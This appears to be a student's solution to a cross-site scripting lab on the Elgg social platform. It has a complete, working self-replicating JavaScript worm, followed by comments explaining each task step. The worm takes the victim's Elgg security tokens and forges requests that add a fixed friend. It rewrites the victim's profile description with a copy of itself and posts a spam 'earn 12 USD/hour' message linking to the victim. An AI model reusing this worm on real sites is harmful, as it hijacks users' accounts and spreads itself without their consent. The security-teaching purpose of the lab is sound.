<script  id="worm" type="text/javascript">
	
	//task 4 step 2
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;


	//task 4 step 1

	//Construct the content of your url.
	//task 1 step 1 and 2
	var sendurl1="/action/friends/add?friend=47"+ts+token; //FILL IN
	
	//task 2 step 1
	var sendurl2="/action/profile/edit"; //FILL IN
	//task 2 step 2 and 3		&& 	task 4 step 3
	var content2=token+ts+ "&name=" +elgg.session.user.name + "&description="+ wormCode +"&accesslevel%5Bdescription%5D=1&briefdescription=b&accesslevel%5Bbriefdescription%5D=1&location=c&accesslevel%5Blocation%5D=1&interests=d&accesslevel%5Binterests%5D=1&skills=e&accesslevel%5Bskills%5D=1&contactemail=f%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=g&accesslevel%5Bphone%5D=1&mobile=h&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fwww.google.com%2F&accesslevel%5Bwebsite%5D=1&twitter=j&accesslevel%5Btwitter%5D=1&guid="+elgg.session.user.guid; //FILL IN

	//task 3 step 1
        var sendurl3="/action/thewire/add"; //FILL IN
	//task 3 step 2 	&& 	task 4 step 3
	var content3=token+ts+ "&body=&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2F"+elgg.session.user.username; //FILL IN

	


	//Create and send Ajax request to add friend
	//task 1 step 3
	if (elgg.session.user.guid != 47) {
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl1,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	
	if(elgg.session.user.guid != 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		//task 2 step 4
		Ajax.open("POST",sendurl2,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content2);
	}
	
	if(elgg.session.user.guid != 47)
	{
		//Create and send Ajax request to post on wire
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl3,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content3);
	}
	}
</script>

/*		---TASK 1 STEPS---
	1. I inspected the source, when the "Add friend" button was pressed to find the url.
	2. Having gotten the url structure, the sendurl variable was reconstructed using str cat, using ts and token fron elgg.
	3. The userId of currently logged in user was found out also by inspecting source from elgg as guid and a condition was set to prevent samy from adding himself as a friend.
*/

/*		---TASK 2 STEPS---	
	1. first the sendurl was constructed by inspecting the request url upon clicking save after editing profile.
	2. after filling out the form and submitting, I inspected the post request body to get the body of request content.
	3. Upon getting the content structure, I reconstructed the content to contain the elgg ts, token, display name and userid of the currently logged in user.
	4. Ajax request was modified to "POST".
*/

/*		---TASK 3 STEPS---
	similar to task 2.
	1. url was retrieved by inspecting the button pressed on the wire, i.e. the post request url.
	2. body of the content was retrieved by first manually posting on the victim's wire and then inspecting the post request body.
*/


/* 		---TASK 4 STEPS---
	1. Task 1,2 and 3 was merged.
	2. a DOM API was used to copy and replicate the whole script into the victim's description.
	3. The content of task 2 and 3 was modiefied to-
		i) save the script on the victim's description using the dom api
		ii) contain link to the victim's profile using elgg username.
*/
